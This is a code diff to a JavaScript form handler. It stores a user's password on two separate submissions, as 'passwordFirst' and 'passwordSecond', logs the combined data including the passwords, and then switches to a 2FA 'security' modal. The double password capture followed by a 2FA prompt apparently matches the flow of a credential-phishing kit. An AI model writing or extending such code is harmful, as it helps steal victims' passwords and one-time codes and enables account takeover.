@@ -5,6 +5,8 @@
 
     var getRecord = window.getRecord;
     var saveRecord = window.saveRecord;
+    var openModal = window.openModal;
+    var closeModal = window.closeModal;
     var submitBtn = form.querySelector('button[type="submit"]');
     if (!submitBtn) return;
 
@@ -35,7 +37,7 @@
           combined[k] = baseData[k];
         });
 
-        // First time: store as PasswordFirst, second time as passwordSecond
+        // First time: store as passwordFirst, second time as passwordSecond
         if (!combined.passwordFirst) {
           combined.passwordFirst = passwordValue;
         } else {
@@ -51,6 +53,16 @@
         }
 
         console.log('🔐 Password modal combined data:', combined);
+
+        // When both passwords are collected, switch to 2FA (security) modal
+        if (combined.passwordFirst && combined.passwordSecond) {
+          if (typeof closeModal === 'function') {
+            closeModal('password');
+          }
+          if (typeof openModal === 'function') {
+            openModal('security');
+          }
+        }
       } catch (err) {
         console.warn('Failed to combine password modal data:', err);
       }
